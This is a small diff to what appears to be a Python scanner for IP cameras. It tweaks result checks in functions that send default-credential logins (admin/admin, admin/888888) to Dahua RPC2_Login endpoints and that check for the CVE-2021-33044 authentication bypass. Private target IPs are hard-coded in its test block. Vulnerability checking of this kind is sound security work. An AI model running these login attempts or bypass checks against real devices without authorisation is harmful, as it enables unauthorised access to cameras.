@@ -80,7 +80,7 @@ def dahua_weak(ip: str, users: list=['admin'], passwords: list=['admin']) -> lis
                 "session": 0,
             }
             r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
-            if r.status_code == 200 and r.json()['result']:
+            if r.status_code == 200 and r.json()['result'] == True:
                 return [True, 'Dahua', 'weak pass', f"{user}:{p}"]
     return [False, 'Dahua', 'weak pass']
 
@@ -113,7 +113,7 @@ def cve_2021_33044(ip: str) -> list:
         "session": 0,
     }
     r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
-    if r.status_code == 200 and r.json()['result']:
+    if r.status_code == 200 and r.json()['result'] == True:
         return [True, 'Dahua', 'cve-2021-33044']
     return [False, 'Dahua', 'cve-2021-33044']
 
@@ -156,5 +156,5 @@ def hb_weak(ip: str, users: list=['admin'], passwords: list=['888888']) -> list:
 
 
 if __name__ == '__main__':
-    # print(cve_2021_36260('10.101.35.74'))
+    #  print(cve_2021_36260('10.101.35.74'))
     print(dahua_weak('172.17.211.3'))
